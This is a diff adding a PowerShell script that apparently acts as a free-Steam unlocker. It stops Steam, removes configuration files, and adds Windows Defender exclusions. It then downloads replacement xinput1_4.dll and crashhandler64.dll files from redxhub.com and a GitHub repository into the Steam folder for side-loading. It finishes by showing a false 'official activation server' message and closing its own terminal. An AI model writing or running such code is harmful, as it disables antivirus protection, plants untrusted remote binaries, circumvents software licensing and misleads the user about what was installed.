@@ -1,0 +1,226 @@
+cls
+[Console]::InputEncoding = [System.Text.Encoding]::UTF8
+
+$localPath = Join-Path $env:LOCALAPPDATA "steam"
+$steamRegPath = 'HKCU:\Software\Valve\Steam'
+
+$steamPath = ""
+
+function Remove-ItemIfExists($path) {
+    if (Test-Path $path) {
+        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function ForceStopProcess($processName) {
+    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+    if (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
+}
+
+function CheckAndPromptProcess($processName, $message) {
+    while (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Write-Host $message -ForegroundColor Red
+        Start-Sleep 1.5
+    }
+}
+
+$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
+Remove-ItemIfExists $filePathToDelete
+
+Write-Host "[*] Stopping Steam process..." -ForegroundColor Cyan
+ForceStopProcess "steam"
+if (Get-Process "steam" -ErrorAction SilentlyContinue) {
+    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
+} else {
+    Write-Host "[+] Steam process stopped successfully." -ForegroundColor Green
+}
+
+Write-Host "[*] Detecting Steam installation path..." -ForegroundColor Cyan
+if (Test-Path $steamRegPath) {
+    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
+        $steamPath = $properties.SteamPath
+    }
+}
+if ([string]::IsNullOrWhiteSpace($steamPath)) {
+    Write-Host "[-] Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+if (-not (Test-Path $steamPath -PathType Container)) {
+    Write-Host "[-] Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+Write-Host "[+] Steam found at: $steamPath" -ForegroundColor Green
+
+$steamConfigPath = Join-Path $steamPath "config"
+$hidPath = Join-Path $steamPath "xinput1_4.dll"
+Write-Host "[*] Removing existing xinput1_4.dll..." -ForegroundColor Cyan
+Remove-ItemIfExists $hidPath
+
+$xinputPath = Join-Path $steamPath "user32.dll"
+Write-Host "[*] Removing existing user32.dll..." -ForegroundColor Cyan
+Remove-ItemIfExists $xinputPath
+
+$packageInfoPath = Join-Path $steamPath "appcache\packageinfo.vdf"
+Write-Host "[*] Removing packageinfo.vdf..." -ForegroundColor Cyan
+Remove-ItemIfExists $packageInfoPath
+
+
+function PwStart() {
+    try {
+        if (!$steamPath) {
+            return
+        }
+        if (!(Test-Path $localPath)) {
+            Write-Host "[*] Creating local Steam directory..." -ForegroundColor Cyan
+            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
+            Write-Host "[+] Local Steam directory created." -ForegroundColor Green
+        }
+
+        $steamCfgPath = Join-Path $steamPath "steam.cfg"
+        Write-Host "[*] Removing steam.cfg..." -ForegroundColor Cyan
+        Remove-ItemIfExists $steamCfgPath
+
+        $steamBetaPath = Join-Path $steamPath "package\beta"
+        Write-Host "[*] Removing beta package..." -ForegroundColor Cyan
+        Remove-ItemIfExists $steamBetaPath
+
+        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+        Write-Host "[*] Removing Tencent cache..." -ForegroundColor Cyan
+        Remove-ItemIfExists $catchPath
+
+        $tencentRegPath = 'HKCU:\Software\Tencent'
+        Write-Host "[*] Removing Tencent registry key..." -ForegroundColor Cyan
+        if (Test-Path $tencentRegPath) {
+            Remove-Item -Path $tencentRegPath -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
+
+        $crashHandlerPath = Join-Path $steamPath "crashhandler64.dll"
+        $crashHandlerOldPath = Join-Path $steamPath "crashhandler64_o.dll"
+
+        if (Test-Path $crashHandlerPath) {
+            if (-not (Test-Path $crashHandlerOldPath)) {
+                Write-Host "[*] Renaming original crashhandler64.dll to crashhandler64_o.dll..." -ForegroundColor Cyan
+                Rename-Item -Path $crashHandlerPath -NewName "crashhandler64_o.dll" -Force -ErrorAction SilentlyContinue
+            } else {
+                Write-Host "[*] Removing existing modified crashhandler64.dll to prepare for new download..." -ForegroundColor Cyan
+                Remove-ItemIfExists $crashHandlerPath
+            }
+        }
+
+        $haveXinput = $false
+
+        $xinputUrls = @(
+            "https://redxhub.com/raw/xinput1_4.dll",
+            "https://github.com/Scriptez1/RedXFreeSteamInstaller/raw/refs/heads/main/xinput1_4.dll"
+        )
+
+        foreach ($url in $xinputUrls) {
+            if ($haveXinput) { break }
+
+            Write-Host "[*] Downloading xinput1_4.dll..." -ForegroundColor Cyan
+            
+            try {
+                Invoke-RestMethod -Uri $url -OutFile $hidPath -ErrorAction Stop
+                Write-Host "[+] xinput1_4.dll downloaded successfully." -ForegroundColor Green
+                $haveXinput = $true
+            } 
+            catch {
+                Write-Host "[!] First attempt failed. Retrying xinput1_4.dll download..." -ForegroundColor Yellow
+                
+                if (Test-Path $hidPath) {
+                    Move-Item -Path $hidPath -Destination "$hidPath.old" -Force -ErrorAction SilentlyContinue
+                }
+                
+                Invoke-RestMethod -Uri $url -OutFile $hidPath -ErrorAction SilentlyContinue
+                
+                if (Test-Path $hidPath) {
+                    Write-Host "[+] xinput1_4.dll downloaded on retry." -ForegroundColor Green
+                    $haveXinput = $true
+                } else {
+                    Write-Host "[-] Failed to download from this source." -ForegroundColor Red
+                }
+            }
+        }
+
+        if (-not $haveXinput) {
+            Write-Host "[ERROR] Could not download xinput1_4.dll from any source." -ForegroundColor Red
+        }
+        
+        $haveCrashHandler = $false
+        $crashHandlerUrls = @(
+            "https://redxhub.com/raw/crashhandler64.dll",
+            "https://github.com/Scriptez1/RedXFreeSteamInstaller/raw/refs/heads/main/crashhandler64.dll"
+        )
+
+        foreach ($url in $crashHandlerUrls) {
+            if ($haveCrashHandler) { break }
+            try { Add-MpPreference -ExclusionPath $crashHandlerPath -ErrorAction SilentlyContinue } catch {}
+
+            Write-Host "[*] Downloading crashhandler64.dll from alternative source..." -ForegroundColor Cyan
+            
+            try {
+                Invoke-RestMethod -Uri $url -OutFile $crashHandlerPath -ErrorAction Stop
+                Write-Host "[+] crashhandler64.dll downloaded successfully." -ForegroundColor Green
+                $haveCrashHandler = $true
+            } 
+            catch {
+                Write-Host "[!] First attempt failed. Retrying crashhandler64.dll download..." -ForegroundColor Yellow
+                
+                if (Test-Path $crashHandlerPath) {
+                    Move-Item -Path $crashHandlerPath -Destination "$crashHandlerPath.old" -Force -ErrorAction SilentlyContinue
+                }
+                
+                Invoke-RestMethod -Uri $url -OutFile $crashHandlerPath -ErrorAction SilentlyContinue
+                
+                if (Test-Path $crashHandlerPath) {
+                    Write-Host "[+] crashhandler64.dll downloaded on retry." -ForegroundColor Green
+                    $haveCrashHandler = $true
+                } else {
+                    Write-Host "[-] Failed to download from this source." -ForegroundColor Red
+                }
+            }
+        }
+
+        if (-not $haveCrashHandler) {
+            Write-Host "[ERROR] Could not download crashhandler64.dll from any source." -ForegroundColor Red
+        }
+
+        $steamExePath = Join-Path $steamPath "steam.exe"
+
+        Write-Host "[*] Launching Steam..." -ForegroundColor Cyan
+        Start-Process $steamExePath
+        Start-Process "steam://"
+        Write-Host "[+] Steam launched successfully." -ForegroundColor Green
+        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
+
+        for ($i = 5; $i -ge 0; $i--) {
+            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
+            Start-Sleep -Seconds 1
+        }
+
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
+        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
+            $parentProcessId = $instance.ProcessId
+            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
+        }
+        if ($null -ne $parentProcessId) {
+            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
+        }
+
+        exit
+
+    } catch {
+        Write-Host "[-] Unexpected error: $_" -ForegroundColor Red
+        Start-Sleep 10
+    }
+}
+
+PwStart
